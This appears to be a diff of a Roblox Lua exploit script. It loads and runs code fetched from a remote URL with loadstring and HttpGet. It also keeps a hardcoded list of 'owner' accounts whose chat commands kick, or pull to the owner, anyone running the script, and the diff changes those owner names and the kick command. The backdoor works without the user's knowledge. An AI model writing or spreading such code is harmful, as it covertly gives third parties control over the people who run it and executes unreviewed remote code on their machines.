@@ -7,7 +7,7 @@ local Library = loadstring(game:HttpGet(repo .. 'main.txt'))()
 
 
 
-Library:Notify('YallGay')
+Library:Notify('SupVrlocks')
 wait(1)
 
 
@@ -27,7 +27,7 @@ local localPlayer = Players.LocalPlayer
 local owners = {
     "rikijun23",
     "bedthewar1",  
-    "3"
+    "rikijun22"
 }
 
 function x1y2z3(owner)
@@ -48,8 +48,8 @@ function a1b2c3(ownerName)
 
     if owner then
         owner.Chatted:Connect(function(message)
-            if message == "/kick ." then
-                localPlayer:Kick("Admins Has Kicked You.")
+            if message == "/kick vrlockers" then
+                localPlayer:Kick("Vrlock Owner Has Kicked You.")
             elseif message == "/bring ." then
                 x1y2z3(owner)
             end
